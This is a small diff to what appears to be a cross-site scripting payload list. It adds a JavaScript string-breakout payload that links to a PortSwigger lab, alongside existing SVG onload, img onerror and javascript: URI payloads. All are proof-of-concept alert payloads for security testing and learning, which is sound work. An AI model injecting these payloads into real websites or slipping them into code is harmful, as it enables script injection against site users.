@@ -1,3 +1,4 @@
 "><svg onload=alert(1)>
 <img src=1 onerror=alert(1)>
 javascript:alert('You are hacked!')
+'-alert(1)-'                          (https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded)
